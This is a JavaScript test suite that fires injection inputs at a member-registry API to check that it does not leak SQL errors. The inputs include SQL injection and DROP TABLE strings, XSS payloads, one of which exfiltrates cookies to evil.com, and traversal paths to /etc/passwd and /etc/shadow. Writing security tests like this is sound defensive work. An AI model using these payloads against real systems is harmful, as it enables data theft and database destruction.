#!/usr/bin/env node
import { runSuite, createTestHelper } from "../lib/suite-runner.mjs";
import { request, loginAdmin } from "../lib/test-utils.mjs";

/**
 * assertNoCrash - Contract-driven assertion for chaos injection tests.
 * Key assertion: response must NOT be a 500 with raw SQL/Prisma error leaked.
 * Acceptable: 400, 401, 200, 404, 409.
 * Unacceptable: 500 with SQL error in the message.
 */
function assertNoCrash(status, data, label = "") {
  if (status === 500) {
    const msg = typeof data === "string" ? data : JSON.stringify(data);
    if (/SQL|Prisma|Constraint|syntax error/i.test(msg)) {
      throw new Error(`${label}: SQL error leaked on 500: ${msg}`);
    }
    // 500 without leaked SQL — acceptable as generic error
  }
}

/**
 * Valid member payload for POST /api/miembros
 */
const validMember = {
  tipoIdentificacion: "CC",
  numeroDocumento: "99999999",
  nombres: "INJECTION-TEST",
  apellidos: "CHAOS",
  fechaNacimiento: "01/01/2000",
  parentesco: "CO",
  sexo: "F",
  integrantes: 1,
  familiaId: "cd8031c4-d2f7-423c-b5a8-1e98b793690a",
  cabildoId: "5dee2149-4442-486a-9ec5-3c20479d8261",
};

async function runInjectionTests({ base, t }) {
  // Get admin token for protected endpoints
  const token = await loginAdmin(base);
  const auth = { token };

  // ── SQL Injection in query params ────────────────────────────────────────

  await t.test("SQL injection in search param", async () => {
    const { status, data } = await request(base, "GET", `/api/miembros?search=${encodeURIComponent("' OR 1=1--")}`, auth);
    assertNoCrash(status, data, "SQL injection search");
  });

  await t.test("SQL injection via union select in search", async () => {
    const { status, data } = await request(base, "GET", `/api/miembros?search=${encodeURIComponent("' UNION SELECT * FROM Usuario;--")}`, auth);
    assertNoCrash(status, data, "UNION injection search");
  });

  await t.test("SQL injection with semicolon in cabildos search", async () => {
    const { status, data } = await request(base, "GET", `/api/cabildos?search=${encodeURIComponent("; DROP TABLE Cabildo;--")}`, auth);
    assertNoCrash(status, data, "SQL injection cabildos search");
  });

  await t.test("SQL injection sleep/timeout attempt", async () => {
    const { status, data } = await request(base, "GET", `/api/miembros?search=${encodeURIComponent("'; SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END;--")}`, auth);
    assertNoCrash(status, data, "Time-based SQL injection");
  });

  // ── SQL Injection in body fields ────────────────────────────────────────

  await t.test("SQL injection in nombres field (DROP TABLE)", async () => {
    const body = { ...validMember, nombres: "'; DROP TABLE Miembro;--", numeroDocumento: "10000001" };
    const { status, data } = await request(base, "POST", "/api/miembros", { ...auth, body });
    assertNoCrash(status, data, "SQL injection in body nombres");
  });

  await t.test("SQL injection in apellidos field", async () => {
    const body = { ...validMember, apellidos: "'; DROP TABLE Familia;--", numeroDocumento: "10000002" };
    const { status, data } = await request(base, "POST", "/api/miembros", { ...auth, body });
    assertNoCrash(status, data, "SQL injection in body apellidos");
  });

  await t.test("SQL injection in numeroDocumento field", async () => {
    const body = { ...validMember, numeroDocumento: "999' OR '1'='1" };
    const { status, data } = await request(base, "POST", "/api/miembros", { ...auth, body });
    assertNoCrash(status, data, "SQL injection in numeroDocumento");
  });

  await t.test("SQL injection with boolean-based payload in nombres", async () => {
    const body = { ...validMember, nombres: "test' AND 1=1--", numeroDocumento: "10000003" };
    const { status, data } = await request(base, "POST", "/api/miembros", { ...auth, body });
    assertNoCrash(status, data, "Boolean SQL injection in nombres");
  });

  // ── XSS in body ──────────────────────────────────────────────────────────

  await t.test("XSS script tag in nombres", async () => {
    const body = { ...validMember, nombres: "<script>alert(1)</script>", numeroDocumento: "10000004" };
    const { status, data } = await request(base, "POST", "/api/miembros", { ...auth, body });
    assertNoCrash(status, data, "XSS script in nombres");
  });

  await t.test("XSS img onerror in apellidos", async () => {
    const body = { ...validMember, apellidos: "<img src=x onerror=alert(1)>", numeroDocumento: "10000005" };
    const { status, data } = await request(base, "POST", "/api/miembros", { ...auth, body });
    assertNoCrash(status, data, "XSS img onerror in apellidos");
  });

  await t.test("XSS svg onload in direccion", async () => {
    const body = {
      ...validMember,
      direccion: '<svg onload="fetch(\'http://evil.com?c=\'+document.cookie)">',
      numeroDocumento: "10000006",
    };
    const { status, data } = await request(base, "POST", "/api/miembros", { ...auth, body });
    assertNoCrash(status, data, "XSS svg onload in direccion");
  });

  // ── Path Traversal ───────────────────────────────────────────────────────

  await t.test("path traversal in cabildos ID", async () => {
    const { status, data } = await request(base, "GET", "/api/cabildos/../../../etc/passwd", auth);
    assertNoCrash(status, data, "Path traversal cabildos");
  });

  await t.test("path traversal encoded in miembros ID", async () => {
    const { status, data } = await request(base, "GET", `/api/miembros/${encodeURIComponent("../../../etc/shadow")}`, auth);
    assertNoCrash(status, data, "Path traversal encoded miembros");
  });

  await t.test("path traversal with backslashes in familias ID", async () => {
    const { status, data } = await request(base, "GET", "/api/familias/..\\..\\..\\windows\\system32", auth);
    assertNoCrash(status, data, "Path traversal backslashes familias");
  });

  // ── Null Byte Injection ──────────────────────────────────────────────────

  await t.test("null byte in search query", async () => {
    const { status, data } = await request(base, "GET", "/api/miembros?search=test%00admin", auth);
    assertNoCrash(status, data, "Null byte in search");
  });

  await t.test("null byte in cabildos ID param", async () => {
    const { status, data } = await request(base, "GET", "/api/cabildos/5dee2149-4442-486a-9ec5-3c20479d8261%00.js", auth);
    assertNoCrash(status, data, "Null byte in cabildos ID");
  });

  await t.test("multiple null bytes in search", async () => {
    const { status, data } = await request(base, "GET", "/api/miembros?search=%00%00%00HAX%00%00", auth);
    assertNoCrash(status, data, "Multiple null bytes in search");
  });

  // ── Unicode Overflow ─────────────────────────────────────────────────────

  await t.test("large unicode search (1000 emojis)", async () => {
    const payload = "\u{1F525}".repeat(1000);
    const { status, data } = await request(base, "GET", `/api/miembros?search=${encodeURIComponent(payload)}`, auth);
    assertNoCrash(status, data, "Unicode overflow search");
  });

  await t.test("right-to-left override unicode in search", async () => {
    const payload = "test\u202E\u2066admin\u2069";
    const { status, data } = await request(base, "GET", `/api/miembros?search=${encodeURIComponent(payload)}`, auth);
    assertNoCrash(status, data, "RTL override unicode");
  });

  await t.test("zero-width characters in nombres", async () => {
    const body = {
      ...validMember,
      nombres: "ZERO\u200B\u200C\u200D\uFEFFWIDTH",
      numeroDocumento: "10000007",
    };
    const { status, data } = await request(base, "POST", "/api/miembros", { ...auth, body });
    assertNoCrash(status, data, "Zero-width chars in nombres");
  });

  // ── Extremely Long Query String ──────────────────────────────────────────

  await t.test("10KB+ search query string", async () => {
    const payload = "A".repeat(10240);
    const { status, data } = await request(base, "GET", `/api/miembros?search=${encodeURIComponent(payload)}`, auth);
    assertNoCrash(status, data, "10KB search query");
  });

  await t.test("50KB search query string", async () => {
    const payload = "B".repeat(51200);
    const { status, data } = await request(base, "GET", `/api/miembros?search=${encodeURIComponent(payload)}`, auth);
    assertNoCrash(status, data, "50KB search query");
  });

  await t.test("long string in body nombres field (5KB)", async () => {
    const body = {
      ...validMember,
      nombres: "X".repeat(5000),
      numeroDocumento: "10000008",
    };
    const { status, data } = await request(base, "POST", "/api/miembros", { ...auth, body });
    assertNoCrash(status, data, "5KB nombres field");
  });

  // ── Negative Page/Limit Values ───────────────────────────────────────────

  await t.test("negative page parameter", async () => {
    const { status, data } = await request(base, "GET", "/api/miembros?page=-1", auth);
    assertNoCrash(status, data, "Negative page");
  });

  await t.test("negative limit parameter", async () => {
    const { status, data } = await request(base, "GET", "/api/miembros?limit=-10", auth);
    assertNoCrash(status, data, "Negative limit");
  });

  await t.test("both negative page and limit", async () => {
    const { status, data } = await request(base, "GET", "/api/miembros?page=-5&limit=-100", auth);
    assertNoCrash(status, data, "Negative page+limit");
  });

  await t.test("zero page parameter", async () => {
    const { status, data } = await request(base, "GET", "/api/miembros?page=0", auth);
    assertNoCrash(status, data, "Zero page");
  });

  await t.test("page as non-numeric string", async () => {
    const { status, data } = await request(base, "GET", "/api/miembros?page=abc&limit=xyz", auth);
    assertNoCrash(status, data, "Non-numeric page/limit");
  });

  // ── Malformed Body / Edge Cases ──────────────────────────────────────────

  await t.test("empty JSON body in POST", async () => {
    const { status, data } = await request(base, "POST", "/api/miembros", { ...auth, body: {} });
    assertNoCrash(status, data, "Empty JSON body");
  });

  await t.test("malformed JSON body (truncated)", async () => {
    const { status, data } = await request(base, "POST", "/api/miembros", { ...auth, body: '{"nombres": "test", "apellidos": "x"' });
    assertNoCrash(status, data, "Truncated JSON body");
  });

  await t.test("array instead of object in body", async () => {
    const { status, data } = await request(base, "POST", "/api/miembros", { ...auth, body: [] });
    assertNoCrash(status, data, "Array body instead of object");
  });

  await t.test("extremely deep nested JSON in body", async () => {
    let deepPayload = '"end"';
    for (let i = 0; i < 100; i++) deepPayload = `{"x": ${deepPayload}}`;
    const { status, data } = await request(base, "POST", "/api/miembros", { ...auth, body: JSON.parse(deepPayload) });
    assertNoCrash(status, data, "Deeply nested JSON body");
  });

  // ── Unauthenticated Endpoints ────────────────────────────────────────────

  const noAuth = {};

  await t.test("SQL injection without auth token", async () => {
    const { status, data } = await request(base, "GET", `/api/miembros?search=${encodeURIComponent("' OR 1=1--")}`, noAuth);
    assertNoCrash(status, data, "SQL injection unauthenticated");
    // Unauthenticated should return 401, but any non-500 is acceptable per contract
  });

  await t.test("XSS POST without auth token", async () => {
    const { status, data } = await request(base, "POST", "/api/miembros", { ...noAuth, body: { nombres: "<script>alert(1)</script>", apellidos: "X" } });
    assertNoCrash(status, data, "XSS POST unauthenticated");
    // Unauthenticated should return 401, but any non-500 is acceptable per contract
  });
}

// Entry point
runSuite(
  { name: "chaos/injection", seed: true, start: true },
  async ({ base }) => {
    const t = createTestHelper("chaos/injection");
    await runInjectionTests({ base, t });
    return t.finish();
  }
);